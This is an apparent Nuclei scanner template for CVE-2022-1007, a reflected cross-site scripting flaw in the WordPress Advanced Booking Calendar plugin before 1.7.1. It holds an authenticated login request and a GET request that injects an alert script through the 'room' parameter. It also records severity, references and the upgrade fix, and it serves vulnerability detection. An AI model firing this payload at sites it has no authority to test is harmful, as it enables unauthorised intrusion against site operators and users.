http:
- matchers:
  - condition: and
    dsl:
    - contains(body_2, '<script>alert(document.domain)</script>')
    - contains(body_2, 'advanced-booking-calendar')
    - contains(header_2, 'text/html')
    - status_code_2 == 200
    type: dsl
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
  - 'GET /wp-admin/admin.php?page=advanced-booking-calendar-show-seasons-calendars&setting=changeSaved&room=1111%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3C%22
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2022-1007
info:
  author: 8arthur
  classification:
    cpe: cpe:2.3:a:elbtide:advanced_booking_calendar:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-1007
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.87539
    epss-score: 0.03683
  description: 'WordPress Advanced Booking Calendar plugin before 1.7.1 contains a
    cross-site scripting vulnerability. It does not sanitize and escape the room parameter
    before outputting it back in an admin page. An attacker can inject arbitrary script
    in the browser of an unsuspecting user in the context of the affected site. This
    can allow the attacker to steal cookie-based authentication credentials and launch
    other attacks.

    '
  impact: 'Successful exploitation of this vulnerability could lead to the execution
    of arbitrary script code in the context of the affected website, potentially allowing
    an attacker to steal sensitive information or perform actions on behalf of the
    user.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: advanced_booking_calendar
    vendor: elbtide
    verified: true
  name: WordPress Advanced Booking Calendar <1.7.1 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/6f5b764b-d13b-4371-9cc5-91204d9d6358
  - https://wordpress.org/plugins/advanced-booking-calendar/
  - https://nvd.nist.gov/vuln/detail/cve-2022-1007
  - https://plugins.trac.wordpress.org/changeset/2695427
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Update to WordPress Advanced Booking Calendar plugin version 1.7.1
    or later to mitigate this vulnerability.

    '
  severity: medium
  tags: cve,cve2022,wp-plugin,advanced-booking-calendar,wp,authenticated,wpscan,wordpress,xss,elbtide,vuln
